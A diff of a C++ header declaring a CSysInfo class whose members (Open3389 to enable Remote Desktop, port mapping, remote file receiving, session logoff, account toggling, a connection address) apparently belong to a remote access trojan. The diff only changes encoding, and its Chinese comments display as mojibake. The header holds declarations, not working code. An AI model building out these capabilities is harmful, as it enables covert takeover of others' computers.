@@ -1,4 +1,4 @@
-// SysInfo.h: interface for the CSysInfo class.
+ï»¿// SysInfo.h: interface for the CSysInfo class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -28,8 +28,8 @@ public:
 	DWORD Open3389(LPVOID lparam);
 	CZXPortMap cPortMap;
 	DWORD nCtrlPort, nPort;
-	TCHAR m_strCurrentProcessFileNames[MAX_PATH]; // µ±Ç°ÕıÔÚ´¦ÀíµÄÎÄ¼ş
-	__int64 m_nCurrentProcessFileLength; // µ±Ç°ÕıÔÚ´¦ÀíµÄÎÄ¼şµÄ³¤¶È
+	TCHAR m_strCurrentProcessFileNames[MAX_PATH]; // å½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶
+	__int64 m_nCurrentProcessFileLength; // å½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶çš„é•¿åº¦
 	void	WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
 	void	CreateLocalRecvFile(LPBYTE lpBuffer);
 	void	GetFileData();
@@ -48,16 +48,16 @@ public:
 	void  GetOnlineInfo(tagOnlineInfo* pInsInfo);
 	void  WtsLoGoff(LPBYTE lpBuffer, UINT nSize);
 	void  WtsDisc(LPBYTE lpBuffer, UINT nSize);
-	void SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //ÕÊ»§ÆôÓÃ Í£Ö¹
+	void SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //å¸æˆ·å¯ç”¨ åœæ­¢
 /*	CSysInfo(CClientSocket *pClient);*/
 	CSysInfo(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl);
 
 	virtual ~CSysInfo();
 private:
-	UINT    NetPort;    //Á¬½Ó¶Ë¿Ú
-    UCHAR   NetLine;    //Á¬½Ó·½Ê½
-    UCHAR   NetOpert;   //ÔËĞĞÀàĞÍ
-    CHAR *Linkaddress;  //Á¬½ÓµØÖ·
+	UINT    NetPort;    //è¿æ¥ç«¯å£
+    UCHAR   NetLine;    //è¿æ¥æ–¹å¼
+    UCHAR   NetOpert;   //è¿è¡Œç±»å‹
+    CHAR *Linkaddress;  //è¿æ¥åœ°å€
 };
 
 #endif // !defined(AFX_SYSINFO_H__F258B531_B1EF_4700_8AE7_4545927A5EA8__INCLUDED_)
